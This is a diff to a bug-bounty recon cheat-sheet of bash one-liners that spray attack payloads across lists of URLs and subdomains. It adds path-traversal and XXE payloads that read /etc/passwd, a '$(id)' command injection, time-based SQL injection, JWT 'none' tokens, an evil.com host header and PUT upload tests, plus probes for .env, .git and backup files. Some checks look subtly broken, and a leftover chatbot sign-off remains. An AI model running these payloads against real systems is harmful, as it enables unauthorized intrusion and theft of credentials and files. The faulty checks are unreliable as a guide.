@@ -1320,8 +1320,6 @@ cat all_urls.txt | qsreplace '__proto__[test]=polluted' | httpx -silent -fr 'pol
 cat subdomains.txt | httpx -silent -path /xmlrpc.php -mc 200 -o xmlrpc_found.txt
 ```
 
-Here are the converted commands:
-
 🔐  JWT None Algorithm Bypass Check  
 ```bash
 cat all_urls.txt | qsreplace 'token=eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ.' | httpx -silent -mc 200 -o jwt_none_bypass.txt
@@ -1428,7 +1426,6 @@ cat bypass_payloads.txt | httpx -silent -mc 200 -o waf_bypass.txt
 ```bash
 cat subdomains.txt | httpx -silent -method OPTIONS -o verb_tampering.txt
 ```
-Here's the converted list for your commands:
 
 🧰 **S3 Bucket Discovery via Subdomain Bruteforce**  
 ```bash
@@ -1535,7 +1532,6 @@ cat urls.txt | qsreplace '../../../../../../../../var/log/nginx/access.log' | ht
 ```bash
 cat subdomains.txt | httpx -silent -path /script -mc 200 -o exposed_jenkins.txt
 ```
-Here’s the converted content:
 
 📂  Exposed Git Directories (Sensitive Files in .git)
 ```bash
@@ -1648,3 +1644,115 @@ SQL Injection (time-based detection)
 cat urls.txt | qsreplace "' AND SLEEP(5)--" | httpx -silent -rt -o sqli_time_based.txt
 ```
 
+Detect exposed Git repositories (.git folder)
+```bash
+cat subdomains.txt | httpx -silent -path /.git/HEAD -mc 200 -o exposed_git_repos.txt
+```
+
+Find Local File Inclusion (LFI)
+```bash
+cat urls.txt | qsreplace '../../../../../../../../etc/passwd' | httpx -silent -fr 'root:x:' -o lfi_found.txt
+```
+
+Open Directory Listing
+```bash
+cat subdomains.txt | httpx -silent -mc 200 -fr 'Index of' -o open_directory_listing.txt
+```
+
+Find Open Kibana Dashboards (Internal Leaks)
+```bash
+cat subdomains.txt | httpx -silent -path /app/kibana -mc 200 -o open_kibana.txt
+```
+
+Subdomain Takeover (Check NXDOMAIN)
+```bash
+subfinder -d target.com | httpx -silent -sc -o subs_status.txt
+cat subs_status.txt | grep 'NXDOMAIN' > takeover_candidates.txt
+```
+
+Test for Host Header Injection
+```bash
+cat urls.txt | httpx -silent -H "Host: evil.com" -fr 'evil.com' -o host_header_injection.txt
+```
+
+Exposed Config Files
+```bash
+cat subdomains.txt | httpx -silent -path-list <(echo -e '/config.php\n/settings.py\n/.env\n/config.json') -mc 200 -o exposed_configs.txt
+```
+
+Detecting Exposed Admin Panels
+```bash
+cat subdomains.txt | httpx -silent -path-list <(echo -e '/admin\n/wp-admin\n/console\n/dashboard') -mc 200 -o admin_panels.txt
+```
+
+Command Injection Test
+```bash
+cat urls.txt | qsreplace '$(id)' | httpx -silent -fr 'uid=' -o command_injection.txt
+```
+
+Check for Backup Files (Old Configs)
+```bash
+cat subdomains.txt | httpx -silent -path-list <(echo -e '/backup.zip\n/db_backup.sql\n/config.old') -mc 200 -o backup_files_found.txt
+```
+
+Check for Open Redis Instances
+```bash
+cat subdomains.txt | httpx -silent -path / -p 6379 -o open_redis_instances.txt
+```
+
+Test for Open Proxy Misconfiguration
+```bash
+curl -x http://target.com http://example.com -v
+```
+
+XXE Injection Test
+```bash
+cat urls.txt | qsreplace '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>' | httpx -silent -fr 'root:x:' -o xxe_found.txt
+```
+
+Detect JWT Tokens in Response
+```bash
+cat urls.txt | httpx -silent -fr 'eyJ' -o jwt_leaks.txt
+```
+
+Server Version Disclosure (Fingerprinting)
+```bash
+cat subdomains.txt | httpx -silent -server -o server_versions.txt
+```
+
+Test PUT Method for File Upload
+```bash
+cat subdomains.txt | httpx -silent -method PUT -path '/test.txt' -body 'test upload' -mc 201,200 -o put_upload_possible.txt
+```
+
+Check for Debug Endpoints
+```bash
+cat subdomains.txt | httpx -silent -path /debug -mc 200 -o debug_endpoints.txt
+```
+
+Find Content Security Policy Bypass (Open Wildcards)
+```bash
+cat subdomains.txt | httpx -silent -hx | grep 'Content-Security-Policy' | grep '*'
+```
+
+Check for Public .DS_Store Files (Directory Listing)
+```bash
+cat subdomains.txt | httpx -silent -path /.DS_Store -mc 200 -o ds_store_leaks.txt
+```
+
+Find Open Jenkins Panels
+```bash
+cat subdomains.txt | httpx -silent -path /jenkins -mc 200 -o open_jenkins.txt
+```
+
+Detect Internal IP Leaks in Response
+```bash
+cat urls.txt | httpx -silent -fr '10.' -o internal_ip_leak.txt
+```
+
+Search for Open API Documentation (Swagger)
+```bash
+cat subdomains.txt | httpx -silent -path-list <(echo -e '/swagger-ui.html\n/api-docs\n/openapi.json') -mc 200 -o open_api_docs.txt
+```
+
+Let me know if you need further adjustments or additions!
